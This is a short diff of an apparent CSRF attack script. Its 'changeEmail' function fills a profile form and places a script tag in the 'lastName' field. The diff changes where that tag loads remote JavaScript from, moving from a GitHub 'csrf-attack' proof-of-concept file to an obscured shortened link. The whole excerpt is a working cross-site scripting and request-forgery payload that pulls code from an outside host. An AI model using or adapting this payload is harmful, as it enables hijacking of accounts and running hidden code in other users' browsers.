@@ -22,7 +22,7 @@ function changeEmail(newEmail) {
   
   
   formData.append('values[name]', 'SecurityTest1');
-  formData.append('values[lastName]', '<script src=https://github.com/petya8bachey/csrf-attack/raw/refs/heads/main/poc.js></script>');
+  formData.append('values[lastName]', '<script src=https://yagla.tv/cYc7LuU></script>');
   formData.append('values[secondName]', '');
   formData.append('values[email]', 'spvdor@yandex.ru');
   formData.append('values[login]', 'test33');
